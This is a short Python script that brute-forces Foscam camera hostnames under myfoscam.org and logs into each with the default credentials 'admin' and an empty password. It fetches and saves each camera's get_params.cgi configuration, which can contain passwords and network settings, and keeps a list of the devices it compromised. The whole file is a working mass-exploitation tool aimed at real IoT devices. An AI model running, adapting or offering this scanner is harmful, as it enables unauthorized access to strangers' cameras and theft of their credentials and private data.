import itertools
import string
import httplib2

bad = 0
good = 0
notthere = 0
goodlist = []
def bruteforce(charset, minlength, maxlength):
    return (''.join(candidate)
        for candidate in itertools.chain.from_iterable(itertools.product(charset, repeat=i)
        for i in range(minlength, maxlength + 1)))

for letterPrefix in bruteforce(string.ascii_lowercase, 2, 2):
    # match it against your password, or whatever
	for digits in bruteforce("0123456789", 4, 4):
		website = "http://" + letterPrefix + digits + ".myfoscam.org/get_params.cgi"
		print "Attempting: " + website + " " + str(good) +"/" + str(good + bad + notthere)
		h = httplib2.Http(timeout=5)
		h.add_credentials('admin','')
		try:
			resp, content = h.request(website)
			if resp["status"] == '200' and "sys_ver" in content:
				f = open(letterPrefix+digits+".config",'w')
				f.write(content)
				f.close()
				good += 1
				goodlist.append(website)
				print("Win!")
			else:
				bad +=1
		except httplib2.ServerNotFoundError:
			notthere +=1
		except:
			notthere +=1
	f = open("foscam.log","w")
	f.write("==============================\n")
	f.write("Bad: " + str(bad)+"\n")
	f.write("Good: " + str(good)+"\n")
	f.write("No Server: " + str(notthere)+"\n")
	for site in goodlist:
		f.write(site+"\n")
	print("==============================")
	f.close()
